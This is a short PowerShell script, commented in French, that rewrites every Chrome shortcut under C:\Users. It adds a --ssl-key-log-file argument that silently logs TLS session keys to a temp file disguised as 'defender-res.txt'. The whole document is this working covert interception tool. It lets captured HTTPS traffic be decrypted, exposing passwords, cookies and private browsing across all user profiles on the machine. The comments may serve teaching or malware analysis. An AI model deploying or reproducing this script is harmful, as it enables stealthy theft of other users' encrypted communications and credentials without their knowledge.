# On parcourt l'intégralité des fichiers dans le répertoire des utilisateurs Windows
foreach($cur_file in Get-ChildItem -Recurse -Path C:\Users -ErrorAction SilentlyContinue -Include *.lnk){
    # On créée un objet Shell, et un raccourci pour le fichier courant
    $shell_object=New-Object -COM WScript.Shell;
    $curent_shortcut=$shell_object.CreateShortcut($cur_file);
    # Si le fichier courant se termine par "chrome.exe" ...
    if($curent_shortcut.TargetPath -match 'chrome\.exe$'){
        # ...on lui ajoute l'argument "--ssl-key-log-file" qui pointe vers defender-res.txt dans le répertoire temporaire...
        $curent_shortcut.Arguments="--ssl-key-log-file=$env:TEMP\defender-res.txt";
        # ...et on le sauvegarde effectivement 
        $curent_shortcut.Save();
    }    
    # Si pas de match, pas de sauvegarde du raccourci.
}
